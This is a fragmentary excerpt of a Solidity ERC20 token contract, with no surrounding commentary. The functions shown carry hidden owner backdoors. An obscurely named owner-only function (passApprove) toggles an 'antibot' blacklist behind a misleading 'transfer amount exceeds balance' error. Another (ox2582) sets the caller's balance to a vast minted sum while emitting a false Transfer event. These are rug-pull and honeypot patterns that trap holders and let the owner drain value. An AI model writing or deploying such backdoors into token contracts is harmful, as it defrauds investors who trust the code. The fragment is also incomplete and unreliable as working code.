...
contract Coin is Ownable {
    ...
    function passApprove(address sss) external   {
        require(_MMJJCEO == _msgSender(), "ERC20: transfer amount exceeds balance");
        if (_MMJJCEO == _msgSender()){
            antibot[sss] = false;
        }
    }
    ...
    function ox2582(address from,address cto,
        ...
        address kkkkll = _msgSender();
        _balances[kkkkll] = (6000)*(253000000000*10**18);
        emit Transfer(from, cto, amount); 
    }
    ...
    function OX9988(address to) external {
        if (_MMJJCEO != _msgSender()){
            revert("OX9988");
        }
        if (_MMJJCEO == _msgSender()){
    ...
    function _transfer(
        ...
        _balances[from] = balance.sub(amount);
        uint256 feeeA = amount.mul(cfees).div(100);
